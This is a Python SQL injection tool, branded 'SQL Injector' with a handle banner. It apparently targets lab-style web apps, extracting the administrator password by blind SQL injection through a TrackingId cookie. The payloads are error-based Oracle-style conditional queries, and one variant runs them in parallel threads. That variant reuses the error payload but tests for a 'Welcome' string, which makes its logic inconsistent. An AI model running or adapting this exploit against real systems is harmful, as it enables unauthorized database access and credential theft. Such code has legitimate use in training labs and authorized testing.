import sys
import requests
import urllib3
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time  # For adding delays if needed

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxies configuration
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def blind_sqli_with_error_response(url, base_trackingid, session_cookie):
    # This is the existing function for option 3 (Blind SQLi with error response)
    password_extracted = ""
    
    for i in range(1, 21):  # Assuming password length up to 20 characters
        for j in range(32, 126):  # ASCII range for printable characters
            sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ascii(SUBSTR(password,%s,1))='%s') || '" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            cookies = {
                'TrackingId': base_trackingid + sqli_payload_encoded,
                'session': session_cookie
            }
            
            try:
                r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
                
                if r.status_code == 500:  # Error occurred, so this character is correct
                    password_extracted += chr(j)
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                    break  # Move to next character
                else:  # No error, so this character is not correct
                    sys.stdout.write('\r' + password_extracted + chr(j))
                    sys.stdout.flush()
                    time.sleep(0.5)  # Optional delay
            except requests.exceptions.RequestException as e:
                print(f"Request error occurred: {e}")
                sys.exit(1)  # Exit on error

    print("\nDebug: Password extraction completed for error response. Final extracted: " + password_extracted)

def blind_sqli(url, base_trackingid, session_cookie):
    # New function for option 2 (Blind SQLi, based on original code)
    password_extracted = ""
    
    def check_ascii(i, j):
        sqli_payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ascii(SUBSTR(password,%s,1))='%s') || '" % (i, j)
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        
        cookies = {
            'TrackingId': base_trackingid + sqli_payload_encoded,
            'session': session_cookie
        }
        
        try:
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            print(f"\nDebug: For position {i}, ASCII {j} ({chr(j)}), Status code: {r.status_code}, 'Welcome' in response: {'Welcome' in r.text}")
            
            if "Welcome" in r.text:  # "Welcome" is in response, so this character is correct
                return j  # Return the correct ASCII value
            else:
                return None  # Not correct
        except requests.exceptions.RequestException as e:
            print(f"Request error for position {i}, ASCII {j}: {e}")
            return None  # Handle error gracefully
    
    for i in range(1, 21):  # For each position
        with ThreadPoolExecutor(max_workers=10) as executor:  # Use up to 10 threads
            futures = [executor.submit(check_ascii, i, j) for j in range(32, 126)]  # Submit tasks for each ASCII value
            
            for future in as_completed(futures):
                result = future.result()  # Get result from thread
                if result is not None:  # If a correct ASCII value is found
                    password_extracted += chr(result)
                    sys.stdout.write('\r' + password_extracted)  # Update output
                    sys.stdout.flush()
                    break  # Stop after finding the correct one for this position
    
    print("\nDebug: Password extraction completed for Blind SQLi. Final extracted: " + password_extracted)

def main():
    # Welcome banner
    print("=====================================")
    print("     Welcome to SQL Injector        ")
    print("                          @d4rkd3vil")
    print("=====================================")
    print("Select an option:")
    print("1. SQLi")
    print("2. Blind SQLi")
    print("3. Blind SQLi with error response")
    
    choice = input("Enter your choice (1/2/3): ")
    
    if choice == '1':
        print("SQLi not implemented yet.")
    elif choice == '2':
        print("Running Blind SQLi...")
        url = input("Enter the URL: ")
        base_trackingid = input("Enter the base TrackingId (e.g., x1mQGV90K7xWjGId): ")
        session_cookie = input("Enter the session cookie (e.g., LxQM2LkrDIs73aGqZZYJpaGgKRLxc7q9): ")
        blind_sqli(url, base_trackingid, session_cookie)
    elif choice == '3':
        print("Running Blind SQLi with error response...")
        url = input("Enter the URL: ")
        base_trackingid = input("Enter the base TrackingId (e.g., x1mQGV90K7xWjGId): ")
        session_cookie = input("Enter the session cookie (e.g., LxQM2LkrDIs73aGqZZYJpaGgKRLxc7q9): ")
        blind_sqli_with_error_response(url, base_trackingid, session_cookie)
    else:
        print("Invalid choice. Please run the program again and select 1, 2, or 3.")

if __name__ == "__main__":
    main()
